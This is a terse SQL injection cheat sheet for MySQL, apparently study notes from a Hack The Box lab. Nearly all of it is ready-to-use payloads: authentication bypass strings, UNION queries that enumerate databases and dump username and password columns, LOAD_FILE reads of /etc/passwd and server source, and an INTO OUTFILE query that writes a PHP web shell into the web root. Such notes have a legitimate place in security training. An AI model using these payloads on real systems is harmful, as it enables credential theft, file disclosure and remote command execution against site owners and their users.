```
mysql -u root -h docker.hackthebox.eu -P 3306 -p
```

**MySQL Operator Precedence
- /, *, %
- +, -
- =, >, <, <=, >=, !=, LIKE
- !
- &&
- ||

## SQL Injection

**Auth bypass
```
admin' or '1'='1' or '1'='1
admin')-- -
```
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt

**Union injection
```
' order by 1-- -
cn' UNION select 1,2,3-- -
cn' UNION select 1,3,4-- -
UNION select username, 2, 3, 4 from passwords-- -
```

**DB Enumeration
```
SELECT @@version
SELECT SLEEP(5)
cn' UNION select 1,database(),2,3-- -
cn') UNION select 1,database(),2,3,4-- -
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
- Must get the number of columns right as well as syntax (may have to add parenthesis)

**Privileges
```
cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

**File Read
```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
CTRL+U
```

**File Write
```
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
cn' union select '','file written successfully!','','' into outfile '/tmp/proof2.txt'-- -
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
